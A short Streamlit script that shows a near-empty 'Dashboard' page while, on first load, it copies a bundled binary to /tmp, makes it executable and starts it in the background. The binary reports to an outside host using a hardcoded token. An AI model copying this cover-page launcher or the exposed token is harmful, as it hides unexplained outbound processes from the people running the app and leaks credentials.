import streamlit as st
import subprocess
import os
import shutil

st.title("Dashboard")

if "started" not in st.session_state:
    st.session_state.started = True

    src = "./komari-agent"
    dst = "/tmp/komari-agent"

    shutil.copy(src, dst)
    os.chmod(dst, 0o755)

    subprocess.Popen([
        dst,
        "-e", "https://agent.0-5.art",
        "-t", "YR3y8NXdWH7FkUbuzgiy6c"
    ])

st.write("Running...")
